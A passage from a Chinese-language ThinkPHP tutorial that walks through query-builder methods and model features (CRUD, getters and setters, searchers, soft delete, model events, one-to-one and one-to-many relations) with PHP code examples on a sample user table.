// 值NULL不计数$user = Db::name(&quot;user&quot;)-&gt;count(&quot;details&quot;);

使用 max() 方法，求出所查询数据字段的最大值；
// 求最大年龄$user = Db::name(&quot;user&quot;)-&gt;max(&quot;age&quot;);

如果 max() 方法，求出的值不是数值，则通过第二参数强制转换；
// 如果最大值不是数值，false关闭强制转换$user = Db::name(&quot;user&quot;)-&gt;max(&quot;name&quot;, false);

使用 min() 方法，求出所查询数据字段的最小值，也可以强制转换；
// 求最小值$user = Db::name(&quot;user&quot;)-&gt;min(&quot;age&quot;);

使用 avg() 方法，求出所查询数据字段的平均值；
// 求平均值$user = Db::name(&quot;user&quot;)-&gt;avg(&quot;age&quot;);

使用 sum() 方法，求出所查询数据字段的总和；
// 求总和$user = Db::name(&quot;user&quot;)-&gt;sum(&quot;age&quot;);

子查询
使用 fetchSql() 方法，传递参数true时，可以设置不执行 SQL，直接返回SQL语句；
// 子查询语句$user = Db::name(&quot;user&quot;)-&gt;fetchSql(true)-&gt;select();

使用 buildSql() 方法，也是返回 SQL 语句，不需要再执行 select()，且有括号；
// 第二种子查询$subQuery = Db::name(&quot;user&quot;)-&gt;buildSql(true);

结合以上方法，我们实现一个子查询；
// 子查询样式$subQuery = Db::name(&quot;user&quot;)-&gt;field(&quot;id&quot;)-&gt;where(&quot;age&quot;,&quot;&gt;&quot;, 18)-&gt;buildSql();$user = Db::name(&quot;user&quot;)-&gt;whereExp(&quot;id&quot;, &quot;IN &quot;.$subQuery)-&gt;select();

使用闭包的方式执行子查询；
// 采用闭包构建子查询$user = Db::name(&quot;user&quot;)-&gt;where(&quot;id&quot;, &quot;IN&quot;, function ($query) &#123;    $query-&gt;name(&quot;user&quot;)-&gt;field(&quot;id&quot;)-&gt;where(&quot;age&quot;,&quot;&gt;&quot;, 18);&#125;)-&gt;select();

原生查询
使用 query() 方法，进行原生 SQL 查询，适用于读取操作，SQL 错误返回 false；
// 原生SQL$user = Db::query(&quot;SELECT * FROM tp_user&quot;);

使用 execute 方法，进行原生 SQL 更新写入等，SQL 错误返回 false；
// 原生更新写入$user = Db::execute(&quot;update tp_user set details=&quot;快快快来救我！&quot; where id=5&quot;);

列字段快捷查询
之前用过诸如：whereIn、whereExp、whereLike等等快捷查询；

所有快捷查询列表的手册位置：数据库 -&gt; 查询构造器 -&gt; 高级查询中，找到快捷查询表格；

whereColumn() 方法，比较两个字段的值，符合的就筛选出来；
// 字段比较，id大于age$user = Db::name(&quot;user&quot;)-&gt;whereColumn(&quot;id&quot;, &quot;&gt;&quot;, &quot;age&quot;)-&gt;select();// 如果是 等于判断 可以简化-&gt;whereColumn(&quot;id&quot;, &quot;age&quot;)

whereFieldName() 方法，查询某个字段的值，注意 FileName 是字段名；
// 获取所有性别为：男$user = Db::name(&quot;user&quot;)-&gt;whereGender(&quot;男&quot;)-&gt;select();// 获取名字叫王二狗的信息$user = Db::name(&quot;user&quot;)-&gt;whereName(&quot;王二狗&quot;)-&gt;find();

getByFieldName() 方法，查询某个字段的值，注意只能查询一条，不需要 **find()**；
// 单条数据$user = Db::name(&quot;user&quot;)-&gt;getByName(&quot;王二狗&quot;);

getFieldByFieldName() 方法，通过查询得到某个指定字段的单一值；
// 查询单条并返回单列，找出王二狗的年龄$user = Db::name(&quot;user&quot;)-&gt;getFieldByName(&quot;王二狗&quot;, &quot;age&quot;);

条件查询
when() 可以通过条件判断，执行闭包里的分支查询；
// 条件判断$user = Db::name(&quot;user&quot;)-&gt;when(false, function ($query) &#123;    // 满足条件执行这段SQL    $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 5);&#125;, function ($query) &#123;    // 不满足条件执行这段SQL    $query-&gt;where(&quot;id&quot;, &quot;&lt;=&quot;, 5);&#125;)-&gt;select();

第一个参数 false 是条件，如果该条件为 true，则执行第一个匿名函数，否则执行第二个匿名函数。
事务
数据库的表引擎需要是 InnoDB 才可以使用，如果不是调整即可；

事务处理，需要执行多个 SQL 查询，数据是关联恒定的；

如果成功一条查询，改变了数据，而后一条失败，则前面的数据回滚；

比如：银行取钱，银行ATM扣了1000，但入口被卡住，你没拿到，这时需要事务处理；

系统提供了两种事务处理的方式，第一种是自动处理，出错自动回滚；
// 出现异常回滚Db::transaction(function () &#123;    Db::name(&quot;user&quot;)-&gt;delete(12);    Db::name(&quot;user&quot;)-&gt;findOrFail(13);&#125;);

手动处理，基本和原生处理类似，可以自行输出错误信息；
// 启动事务Db::startTrans();try &#123;    Db::name(&quot;user&quot;)-&gt;delete(12);    Db::name(&quot;user&quot;)-&gt;findOrFail(13);    //提交事务    Db::commit();&#125; catch (\Exception $e) &#123;    echo &quot;执行SQL失败！&quot;;    // 回滚    Db::rollback();&#125;

获取器
获取器的意思就是：将数据的字段进行转换处理再进行操作；

比如在获取数据列表的时候，将获取到的详情字段全部大写；
// 获取器改变字段值$user = Db::name(&quot;user&quot;)-&gt;withAttr(&quot;details&quot;, function ($value, $data) &#123;    // NULL 不处理    if ($value != null) &#123;        return strtoupper($value);    &#125;&#125;)-&gt;select();

withAttr也是支持JSON字段的，具体参考手册 查询构造器 -&gt; 获取器；


高级查询索引关联
where 方法的数组查询：
// 性别男，年龄大于15岁，常规做法$user = Db::name(&quot;user&quot;)-&gt;where(&quot;age&quot;, &quot;&gt;&quot;, 15)                        -&gt;where(&quot;gender&quot;, &quot;男&quot;)-&gt;select();// 索引数组方式，二维数组，返回的SQL 是一条 AND 并列关系$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;age&quot;, &quot;&gt;&quot;, &quot;15&quot;],    [&quot;gender&quot;,&quot;=&quot;, &quot;男&quot;]])-&gt;select();// 如果是等于，可以直接用关联数组，一维$user = Db::name(&quot;user&quot;)-&gt;where([    &quot;age&quot;     =&gt;  15,    &quot;gender&quot;  =&gt;  &quot;男&quot;])-&gt;select();// 两种模式结合起来，$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;age&quot;, &quot;&gt;&quot;, &quot;15&quot;],    &quot;gender&quot;  =&gt;  &quot;男&quot;])-&gt;select();// 搜索条件独立管理，这里=号写全$map[] = [&quot;age&quot;, &quot;&gt;&quot;, &quot;15&quot;];$map[] = [&quot;gender&quot;,&quot;=&quot;, &quot;男&quot;];$user = Db::name(&quot;user&quot;)-&gt;where($map)-&gt;select();

拼装查询
使用 |(OR) 或 &amp;(AND) 来实现 where 条件的高级查询，where 支持多个连缀；
// or和and 拼装查询$user = Db::name(&quot;user&quot;)-&gt;where(&quot;name|details&quot;, &quot;like&quot;, &quot;%王%&quot;)						-&gt;where(&quot;id&amp;create_time&quot;, &quot;&gt;&quot;, 0)    					-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE ( `name` LIKE &quot;%王%&quot; OR `details` LIKE &quot;%王%&quot; ) AND ( `id` &gt; 0 AND `create_time` &gt; &quot;0&quot; )

索引数组方式，可以在 where 进行多个字段进行查询；
// 索引数组拼装$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;id&quot;, &quot;&gt;&quot;, &quot;5&quot;],    [&quot;gender&quot;, &quot;=&quot;, &quot;女&quot;],    [&quot;age&quot;, &quot;&lt;=&quot;, 15],    [&quot;details&quot;, &quot;like&quot;, &quot;%我%&quot;]])-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE `id` &gt; 5 AND `gender` = &quot;女&quot; AND `age` &lt;= 15 AND `details` LIKE &quot;%我%&quot;

条件字符串复杂组装，比如使用 exp 了，就使用 raw() 方法；
// exp 拼装$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;gender&quot;, &quot;=&quot;, &quot;男&quot;],    [&quot;age&quot;, &quot;exp&quot;, Db::raw(&quot;&gt;=10 AND id&lt;5&quot;)]])-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE `gender` = &quot;男&quot; AND ( `age` &gt;=10 AND id&lt;5 )

如果有多个where，并需要控制优先级，那么可以在需要的部分加上中括号；
// 下面的代码无法控制优先级$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;gender&quot;, &quot;=&quot;, &quot;男&quot;],    [&quot;age&quot;, &quot;exp&quot;, Db::raw(&quot;&gt;=10 AND id&lt;5&quot;)]])-&gt;where(&quot;details&quot;, &quot;like&quot;, &quot;%我%&quot;)-&gt;select();// 外加一个中括号-&gt;where([[    ...]])    // 拼装返回的SQLSELECT * FROM `tp_user` WHERE ( `gender` = &quot;男&quot; AND ( `age` &gt;=10 AND id&lt;5 ) ) AND `details` LIKE &quot;%我%&quot;    // 推荐用变量代替$map =[    [&quot;gender&quot;, &quot;=&quot;, &quot;男&quot;],    [&quot;age&quot;, &quot;exp&quot;, Db::raw(&quot;&gt;=10 AND id&lt;5&quot;)]];-&gt;where([$map])

如果，条件中有多次出现一个字段，并且需要 OR 来左右筛选，可以用 whereOr；
// 多条件重复字段 OR 选项$map1 = [    [&quot;name&quot;, &quot;like&quot;, &quot;%王%&quot;],    [&quot;details&quot;, &quot;=&quot;, null]];$map2 = [    [&quot;gender&quot;, &quot;=&quot;, &quot;女&quot;],    [&quot;details&quot;, &quot;exp&quot;, Db::raw(&quot;IS NOT NULL&quot;)]];$user = Db::name(&quot;user&quot;)-&gt;whereOr([$map1, $map2])-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE ( `name` LIKE &quot;%王%&quot; AND `details` IS NULL ) OR ( `gender` = &quot;女&quot; AND ( `details` IS NOT NULL ) )

模型定义定义模型
为了避免被前面课程中控制器的类名干扰，删除或改名都行：
// UserBak.php，目前不存在任何地方的User.php了class UserBak extends BaseController

定义一个和数据库表相匹配的模型，可在app应用目录下创建model文件夹；
namespace app\model;use think\Model;class User extends Model&#123;    &#125;

模型会自动对应数据表，并且有一套自己的命名规则；

模型类需要去除表前缀(tp_)，采用驼峰式命名，并且首字母大写；
tp_user(表名) =&gt; Usertp_user_type(表名) =&gt; UserType

在控制器段创建一个任意名称的类，当然有语义更好，但为了教学理解起名为：TestUser.php；
namespace app\controller;use app\model\User;// 注意：类名不限制class TestUser&#123;    public function index()    &#123;        return json(User::select());    &#125;&#125;

模型设置
系统会自动识别 模型类名 对应 表名，User.php  对应 user 表（不含前缀）；

但如果你的模型类名不是按照规则对应表名，则需要通过成员字段去设置；
class Abc extends Model&#123;    // 设置表名    protected $name = &quot;user&quot;;&#125;// 使用$table时，指定表时需要完整的表名：tp_user

系统也会默认id为你的主键名，如果不是id，则需要设置；
// 设置主键protected $pk = &quot;uid&quot;;

模型支持初始化功能，需要设置静态方法，并只在第一次实例化的时候执行，且只执行一次；
protected static function init()&#123;	echo &quot;初始化&quot;;&#125;

新增和删除新增操作
用模型新增数据，首先要实例化模型，开发工具会补全use，非集成工具别忘了；
use app\model\User;// 手册new User，这里括号是工具补全的，都可以$user = new User();

使用实例化的方式添加一条数据，并使用 save() 方法进行保存；

注意：使用模型时，会自动给时间字段 create_time，update_time（要有该字段）写入当前时间；
$user = new User();$user-&gt;name = &quot;李白&quot;;$user-&gt;age = 28;$user-&gt;gender = &quot;男&quot;;$user-&gt;details = &quot;床前明月光，好诗！&quot;;// 成功返回true，失败抛异常，其它看手册$user-&gt;save();

也可以通过 save() 传递数据数组的方式，来新增数据；
$user-&gt;save([    &quot;name&quot;  =&gt;  &quot;杜甫&quot;,    &quot;age&quot;   =&gt;  19,    &quot;gender&quot;  =&gt;  &quot;男&quot;,    &quot;details&quot; =&gt;  &quot;一行白鹭上青天，好诗！&quot;]);

使用 allowField() 方法，允许要写入的字段，其它字段就无法写入了；
$user-&gt;allowField([&quot;name&quot;,&quot;age&quot;,&quot;gender&quot;])-&gt;save([    &quot;name&quot;  =&gt;  &quot;蒲松龄&quot;,    &quot;age&quot;   =&gt;  25,    &quot;gender&quot;  =&gt;  &quot;男&quot;,    &quot;details&quot; =&gt;  &quot;十里平湖霜满天，好诗！&quot;]);

模型新增也提供了 replace() 方法来实现 REPLACE into 新增；
$user-&gt;replace()-&gt;save([    &quot;id&quot;    =&gt;  15,    &quot;name&quot;  =&gt;  &quot;蒲松龄&quot;,    &quot;age&quot;   =&gt;  25,    &quot;gender&quot;  =&gt;  &quot;男&quot;,    &quot;details&quot; =&gt;  &quot;十里平湖霜满天，好诗！&quot;]);

当新增成功后，使用 $user-&gt;id ，可以获得自增 ID（主键需是 id）；
return $user-&gt;id;

使用 saveAll()方法，可以批量新增数据，返回批量新增的数组；
return $user-&gt;saveAll([    [        &quot;name&quot;  =&gt;  &quot;赵六&quot;,        &quot;age&quot;   =&gt;  19,        &quot;gender&quot;=&gt;  &quot;男&quot;    ],    [        &quot;name&quot;  =&gt;  &quot;钱七&quot;,        &quot;age&quot;   =&gt;  22,        &quot;gender&quot;=&gt;  &quot;男&quot;,        &quot;details&quot;   =&gt;  &quot;我很有钱，排行老七！&quot;    ]]);

使用 ::create() 静态方法，来创建要新增的数据；
$user = User::create([    &quot;name&quot;  =&gt;  &quot;李逍遥&quot;,    &quot;age&quot;   =&gt;  18,    &quot;gender&quot;=&gt;  &quot;男&quot;,    &quot;details&quot;   =&gt;  &quot;我是一代主角！&quot;], [&quot;name&quot;, &quot;age&quot;, &quot;gender&quot;, &quot;details&quot;], false);//参数 1 是新增数据数组，必选//参数 2 是允许写入的字段，可选//参数 3 为是否 replace 写入，可选，默认 false 为 Insert 写入return $user-&gt;id;

删除操作
使用 find() 方法，通过主键 (id) 查询到想要删除的数据；

然后再通过 delete()方法，将数据删除，返回布尔值；
// 根据主键值，删除数据$user = User::find(20);return $user-&gt;delete();

也可以使用静态方法调用 destroy()方法，通过主键(id)删除数据；
// 单条删除return User::destroy(21);// 批量删除return User::destroy([22, 33, 44]);// 条件删除return User::where(&quot;id&quot;, &quot;&gt;&quot;, 15)-&gt;delete();（返回删除的条目数）

destroy() 方法，使用闭包的方式进行删除；
// 闭包模式User::destroy(function ($query) &#123;    $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 15);&#125;);

更新数据更新
使用 find()方法获取数据，然后通过 save()方法保存修改，返回布尔值；
$user = User::find(19);$user-&gt;details = &quot;我是一代主角！&quot;;return $user-&gt;save();

通过 where()方法结合 find()方法的查询条件获取的数据，进行修改；
$user = User::where(&quot;name&quot;, &quot;李逍遥&quot;)-&gt;find();$user-&gt;details = &quot;我想做二代主角！&quot;;return $user-&gt;save();

save()方法只会更新变化的数据，如果提交的修改数据没有变化，则不更新；

但如果你想强制更新数据，即使数据一样，那么可以使用 force()方法；
// 如何验证被强制了，查看update_time字段是否更新了$user-&gt;force()-&gt;save();

Db::raw()执行 SQL 函数的方式，同样在这里有效；
$user-&gt;age = Db::raw(&quot;age + 2&quot;);

关于验证过滤，后续学习Request再说，手册中 模型 -&gt; 更新 里也有说明：
$user-&gt;allowField([&quot;name&quot;,&quot;age&quot;])-&gt;save(...)

通过 saveAll()方法，可以批量修改数据，返回被修改的数据集合；
$user = new User;return $user-&gt;saveAll([    [&quot;id&quot;=&gt;17, &quot;gender&quot;=&gt;&quot;女&quot;],    [&quot;id&quot;=&gt;18, &quot;gender&quot;=&gt;&quot;女&quot;],    [&quot;id&quot;=&gt;19, &quot;gender&quot;=&gt;&quot;女&quot;],]);

使用静态方法::update()更新，返回的是对象实例；
return User::update([&quot;id&quot;=&gt;17, &quot;gender&quot;=&gt;&quot;男&quot;]);// ID放在后面，返回数据不含IDreturn User::update([&quot;gender&quot;=&gt;&quot;男&quot;], [&quot;id&quot;=&gt;18]);// 限制更新的内容，只允许gender被修改return User::update([&quot;gender&quot;=&gt;&quot;男&quot;, &quot;name&quot;=&gt;&quot;可笑的人&quot;], [&quot;id&quot;=&gt;19], [&quot;gender&quot;]);

查询其实和数据库的查询大差不差
模型的查询
模型的绝大部分语法基本都来自于 Db::name() 的查询：

在手册 模型 -&gt; 查询 中可以查阅，这里就演示几个常用的意思一下：

find() 单个 和 select() 多个;
$user = User::find(1);$user = User::select();$user = User::select([1, 3, 5]);

也可以使用 where()方法进行条件筛选查询数据；
$user = User::where(&quot;id&quot;, &quot;&lt;&quot;, 5)-&gt;select();

$user = User::where(&#x27;name&#x27;, &#x27;thinkphp&#x27;)-&gt;find();

模型方法也可以使用 where 等连缀查询，和数据库查询方式一样；
$user = User::limit(3)-&gt;order(&quot;id&quot;, &quot;desc&quot;)-&gt;select();

模型支持聚合查询：max、min、sum、count、avg 等；
$user = User::count();

模型也支持大量的快捷方式，这里演示一个：
$user = User::whereLike(&quot;name&quot;, &quot;%王%&quot;)-&gt;select();

模型的字段设置字段设置
模型的数据字段和表字段是对应关系，默认会自动获取，包括字段的类型；

自动获取会导致增加一次查询，如果在模型中配置字段信息，会减少内存开销；

可以在模型设置$schema 字段，明确定义字段信息，字段需要对应表写完整；

字段类型的定义可以使用PHP类型或者数据库的字段类型都可以，以便自动绑定类型；
// 设置字段信息，需要写完整的数据表字段protected $schema = [    &quot;id&quot;    =&gt;  &quot;int&quot;,    &quot;name&quot;  =&gt;  &quot;string&quot;,    ...];

设置模型字段，只能对模型有效，对于 Db::name() 查询无法作用。

要让模型和Db查询都支持字段类型设置，分三步：

把上面的$schema先注释掉；

在 config&#x2F;database.php 开启缓存字段；
// 开启字段缓存&quot;fields_cache&quot;    =&gt; true,

在根目录命令行执行命令：
php think optimize:schema



废弃字段
由于历史遗留问题，我们不再想使用某些字段，可以在模型里设置；

设置后，我们在查询和写入时将忽略这些字段；
// 设置废弃字段protected $disuse = [&quot;age&quot;, &quot;details&quot;];

只读字段
只读字段用来保护某些特殊的字段值不被更改，这个字段的值一旦写入，就无法更改；
// 设置只读字段protected $readonly = [&quot;age&quot;, &quot;details&quot;];

然后在控制器端进行修改测试：
// 修改查看只读字段return User::update([&quot;id&quot;=&gt;19, &quot;age&quot;=&gt;22, &quot;name&quot;=&gt;&quot;李逍遥2&quot;, &quot;details&quot;=&gt;&quot;可笑&quot;]);

获取器和修改器获取器
获取器的作用是对模型实例的数据做出自动处理；

一个获取器对应模型的一个特殊方法，该方法为 public；

方法名的命名规范为：getFieldAttr()；

举个例子，数据库表示状态 status 字段采用的是数值；

而页面上，我们需要输出 status 字段希望是中文，就可以使用获取器；

在 User 模型端，我创建一个对外的方法，如下：
// 获取器，改变字段的值public function getStatusAttr($value)&#123;    $status = [-1=&gt;&quot;删除&quot;, 0=&gt;&quot;冻结&quot;, 1=&gt;&quot;正常&quot;, 2=&gt;&quot;待审核&quot;];    return $status[$value];&#125;

控制器端，正常输出数据：
public function attr()&#123;    $user = User::select();    return json($user);&#125;

如果你定义了获取器，并且想获取原始值，可以使用 getData()方法；
$user = User::find(1);echo $user-&gt;getData(&quot;status&quot;);

使用 withAttr 在控制器端实现动态获取器，比如让年龄+100岁；
// 可以传入参数二 $data，获得所有数据，方便数据获取和判断$user = User::select()-&gt;withAttr(&quot;age&quot;, function($value) &#123;    return $value + 100;&#125;);

修改器
模型修改器的作用，就是对模型设置对象的值进行处理；

比如，我们要新增数据的时候，对数据就行格式化、过滤、转换等处理；

模型修改器的命名规则为：setFieldAttr；

我们要设置一个新增，规定输入的年龄都自动+100岁，修改器如下：
// 修改器，写入时改变字段的值public function setAgeAttr($value)&#123;    return $value + 100;&#125;

return User::create([    &quot;name&quot;  =&gt;  &quot;酒剑仙&quot;,    &quot;age&quot;   =&gt;  58,    &quot;gender&quot;=&gt;  &quot;男&quot;,    &quot;details&quot;   =&gt;  &quot;我是隐藏主角！&quot;]);

除了新增，会调用修改器，修改更新也会触发修改器；

模型修改器只对模型方法有效，调用数据库的方法是无效的，比如-&gt;insert();


搜索器和自动时间戳搜索器
搜索器是用于封装字段（或搜索标识）的查询表达式，类似查询范围；

一个搜索器对应模型的一个特殊方法，该方法为 public；

方法名的命名规范为：**searchFieldAttr()**；

举个例子，我们要封装一个 name 字段的模糊查询，然后封装一个时间限定查询；

在 User 模型端，我创建两个对外的方法，如下：
// 搜索器，模糊查找姓名public function searchNameAttr($query, $value, $data)&#123;    $query-&gt;where(&quot;name&quot;, &quot;like&quot;, &quot;%&quot;.$value.&quot;%&quot;);&#125;// 搜索器，限定时间public function searchCreateTimeAttr($query, $value, $data)&#123;    $query-&gt;whereBetweenTime(&quot;create_time&quot;, $value[0], $value[1]);&#125;

在控制器端，通过 withSearch()方法实现模型搜索器的调用；
$user = User::withSearch([&quot;name&quot;, &quot;create_time&quot;],[    &quot;name&quot;          =&gt;  &quot;李&quot;,    &quot;create_time&quot;   =&gt;  [&quot;2023-10-19&quot;, &quot;2023-10-20 23:59:59&quot;]])-&gt;select();

withSearch()中第一个数组参数，限定搜索器的字段，第二个则是表达式值；

如果想在搜索器查询的基础上再增加查询条件，直接使用链式查询即可；
User::withSearch(...)-&gt;where(&quot;gender&quot;, &quot;女&quot;)-&gt;select();

在获取器和修改器都有一个 $data 参数，它的作用是什么？
// 搜索器，模糊查找姓名public function searchNameAttr($query, $value, $data)&#123;    //$halt($data);    $query-&gt;where(&quot;name&quot;, &quot;like&quot;, &quot;%&quot;.$value.&quot;%&quot;);    // 按年龄排序    if (isset($data[&quot;sort&quot;])) &#123;        $query-&gt;order($data[&quot;sort&quot;]);    &#125;&#125;

自动时间戳
如果你想全局开启，在 database.php 中，设置为 true；

此时，写入操作时，会自动对 create_time 和 update_time 进行写入；
&quot;auto_timestamp&quot;  =&gt; true,

如果你只想设置某一个模型开启，需要设置特有字段；
protected $autoWriteTimestamp = true;

自动时间戳只能在模型下有效，数据库方法不可以使用；

如果创建和修改时间戳不是默认定义的，也可以自定义；
protected $createTime = &quot;create_at&quot;;protected $updateTime = &quot;update_at&quot;;

如果业务中只需要 create_time 而不需要 update_time，可以关闭它；
protected $updateTime = false;

也可以动态实现不修改 update_time，具体如下：
$user-&gt;isAutoWriteTimestamp(false)-&gt;save();

软删除和事件软删除
软删除也称为逻辑删除，只是给数据标记 “已删除” 的状态，不是真实的物理删除；

为何要对数据进行软删除，因为真实的物理删除，删了就没了呀。

在模型端设置软删除的功能，引入 SoftDelete，它是 trait；
// 会自动引入SoftDeleteuse think\model\concern\SoftDelete;// 开启软删除，创建delete_time字段，并设置默认为 NULLuse SoftDelete;protected $deleteTime = &quot;delete_time&quot;;

delete_time 默认设置的是 null，如果你想更改这个默认值，可以设置：
protected $defaultSoftDelete = 0;


由于我们之前演示过字段缓存，会导致无法软删除，你可以删除字段缓存，或者重新更新下：
php think optimize:schema

删除分为两种：destroy() 和 delete()，具体如下：
// 软删除User::destroy(1);// 真实删除User::destroy(1,true);$user = User::find(1);// 软删除$user-&gt;delete();// 真实删除$user-&gt;force()-&gt;delete();

软删除后，数据库内的数据只是被标记了删除时间，而搜索数据时，会自动屏蔽这些数据；

在开启软删除功能的前提下，使用 withTrashed() 方法取消屏蔽软删除的数据；
User::withTrashed()-&gt;select();

如果只想查询被软删除的数据，使用 onlyTrashed()方法即可；
User::onlyTrashed()-&gt;select()

如果想让某一条被软删除的数据恢复到正常数据，可以使用 restore()方法；
$user = User::onlyTrashed()-&gt;find(23);$user-&gt;restore();

如果要将软删除后的数据库真实的物理删除，需要先将它恢复，再真实删除；


事件模型事件是指在进行模型的查询和写入操作的时候触发的操作行为。

模型事件只在调用模型的方法生效，使用查询构造器操作是无效的

模型支持如下事件：



事件
描述
事件方法名



after_read
查询后
onAfterRead


before_insert
新增前
onBeforeInsert


after_insert
新增后
onAfterInsert


before_update
更新前
onBeforeUpdate


after_update
更新后
onAfterUpdate


before_write
写入前
onBeforeWrite


after_write
写入后
onAfterWrite


before_delete
删除前
onBeforeDelete


after_delete
删除后
onAfterDelete


before_restore
恢复前
onBeforeRestore


after_restore
恢复后
onAfterRestore


注册的回调方法支持传入一个参数（当前的模型对象实例），但支持依赖注入的方式增加额外参数。

如果before_write、before_insert、 before_update 、before_delete事件方法中返回false或者抛出think\exception\ModelEventException异常的话，则不会继续执行后续的操作。

模型事件定义最简单的方式是在模型类里面定义静态方法来定义模型的相关事件响应。
&lt;?phpnamespace app\model;use think\Model;use app\model\Profile;class User extends Model&#123;    public static function onBeforeUpdate($user)    &#123;    	if (&#x27;thinkphp&#x27; == $user-&gt;name) &#123;        	return false;        &#125;    &#125;        public static function onAfterDelete($user)    &#123;		Profile::destroy($user-&gt;id);    &#125;&#125;

参数是当前的模型对象实例，支持使用依赖注入传入更多的参数。
写入事件onBeforeWrite和onAfterWrite事件会在新增操作和更新操作都会触发.
具体的触发顺序:
// 执行 onBeforeWrite// 如果事件没有返回`false`,那么继续执行// 执行新增或更新操作(onBeforeInsert/onAfterInsert或onBeforeUpdate/onAfterUpdate)// 新增或更新执行成功// 执行 onAfterWrite

注意:模型的新增或更新是自动判断的.
关联模型入门关联表
我们已经有了一张 tp_user 表，主键为：id；我们需要一个附属表，来进行关联；

附属表：tp_profile，建立两个字段：user_id 和 hobby，外键是 user_id；



关联查询
关联模型，顾名思义，就是将表与表之间进行关联和对象化，更高效的操作数据；

创建 User 模型和 Profile 模型，均为空模型；如果已有User，改名UserBak备份起来；
namespace app\model;use think\Model;class User extends Model &#123;&#125;

namespace app\model;use think\Model;class Profile extends Model &#123;&#125;

User 模型端，需要关联 Profile，具体方式如下：
class User extends Model &#123;    public function profile()    &#123;        // 一对一关联，        // 参数1：关联的表模型        // 参数2：默认为 user_id (外键)        return $this-&gt;hasOne(Profile::class);    &#125;&#125;

创建一个控制器用于测试输出：Link.php；
public function index()&#123;    // 主表    $user = User::find(19);    // 访问关联从表    return json($user-&gt;profile);&#125;

一对一关联查询hasOne 模式
hasOne 模式，适合主表关联附表，具体设置方式如下：
class User extends Model&#123;    // 定义与Profile模型的一对一关系    public function profile()    &#123;        return $this-&gt;hasOne(&#x27;Profile&#x27;, &#x27;user_id&#x27;, &#x27;id&#x27;);//返回模型实例    &#125;&#125;//关联模型（必须）：关联的模型名或者类名//外键：默认的外键规则是当前模型名（不含命名空间，下同）+_id ，例如 user_id//主键：当前模型主键，默认会自动获取也可以指定传入

我们了解了表与表关联后，实现的查询方案：
// 主表$user = User::find(19);// 访问关联从表return json($user-&gt;profile-&gt;hobby);

使用 save()方法，可以设置关联修改，通过主表修改附表字段的值：
$user = User::find(19);return $user-&gt;profile-&gt;save([&quot;hobby&quot;=&gt;&quot;和蛇妖玩耍！&quot;]);

-&gt;profile 属性方式可以修改数据，-&gt;profile()方法方式可以新增数据：
// 新增附表数据，先找到主表数据$user = User::find(1);// 然后通过profile()方法实现新增return $user-&gt;profile()-&gt;save([&quot;hobby&quot;=&gt;&quot;不喜欢吃青椒！&quot;]);

belongsTo 模式
belongsTo 模式，适合附表关联主表，具体设置方式如下:
// 注意：此时绑定需要Profile模型创建user()方法执行belongsTo(&quot;关联模型&quot;,[&quot;外键&quot;,&quot;关联主键&quot;]);class Profile extends Model &#123;    public function user()    &#123;        return $this-&gt;belongsTo(User::class);    &#125;&#125;

查询方式，和主附查询方式一致：
// 附表$profile = Profile::find(1);// 访问关联主表return $profile-&gt;user-&gt;name;

使用 hasOne()也能模拟 belongsTo() 来进行查询，这样就可以不用在 Profile 模型进行设置：
// hasWhere// 注意：参数1的profile是方法名，不是模型名$user = User::hasWhere(&quot;profile&quot;, [&quot;id&quot;=&gt;2])-&gt;find();return json($user);// 闭包方式$user = User::hasWhere(&quot;profile&quot;, function ($query) &#123;    $query-&gt;where(&quot;id&quot;, 2);&#125;)-&gt;find();return json($user);

一对多关联查询hasMany 模式
hasMany 模式，适合主表关联附表，实现一对多查询，具体设置方式如下：
// 由于是一对多，需要在附表添加多个相同user_id的数据测试hasMany(&quot;关联模型&quot;,[&quot;外键&quot;,&quot;主键&quot;]);return $this-&gt;hasMany(Profile::class,&quot;user_id&quot;, &quot;id&quot;);

查询方案和一对一相同：
// 主表一对多$user = User::find(1);return json($user-&gt;profile);

使用-&gt;profile()方法模式，可以进一步进行数据的筛选；
// 主表一对多$user = User::find(1);// 进一步筛选数据，保留实际顺序的下标$data = $user-&gt;profile-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10);// 进一步筛选数据，下标重新从0开始，需要连缀select()$data = $user-&gt;profile()-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10)-&gt;select();return json($data);

使用 has()方法，查询关联附表的主表内容，比如大于等于 2 条的主表记录；
// 参数1：profile是方法名$user = User::has(&quot;profile&quot;, &quot;&gt;=&quot;, 2)-&gt;select();return json($user);

使用 hasWhere()方法，查询附表中，可见兴趣的主表记录；
// 查询附表profile中visible为1的兴趣关联主表的记录$user = User::hasWhere(&quot;profile&quot;, [&quot;visible&quot;=&gt;1])-&gt;select();return json($user);

使用 save()和 saveAll()进行关联新增和批量关联新增，方法如下：
// 主表数据$user = User::find(24);// 新增附表关联数据$user-&gt;profile()-&gt;save([&quot;hobby&quot;=&gt;&quot;测试喜欢1&quot;, &quot;visible&quot;=&gt;1]);// 批量新增$user-&gt;profile()-&gt;saveAll([    [&quot;hobby&quot;=&gt;&quot;测试喜欢2&quot;, &quot;visible&quot;=&gt;1],    [&quot;hobby&quot;=&gt;&quot;测试喜欢3&quot;, &quot;visible&quot;=&gt;1],]);

使用 together()方法，可以删除主表内容时，将附表关联的内容全部删除；
// 删除主数据，并清空关联附表数据$user = User::with(&quot;profile&quot;)-&gt;find(29);$user-&gt;together([&quot;profile&quot;])-&gt;delete();

特别注意：由于外键约束设置问题，默认情况下，关联操作可能会导致1451错误；

解决方案：在 profile 表中 设置外键 删除和修改时 为：CASCADE即可，详细阅读如下：
https://blog.csdn.net/qq_23994787/article/details/86063623

模型预载入和统计预载入
在普通的关联查询下，我们循环数据列表会执行 n+1 次 SQL 查询；
// 主表三条记录$list = User::select([10, 11, 12]);// 遍历附表foreach ($list as $user)&#123;    dump($user-&gt;profile);&#125;

上面继续采用普通关联查询的构建方式，打开 trace 调试工具，会得到四次查询；

如果采用关联预载入的方式，将会减少到两次，也就是起步一次，循环一次；
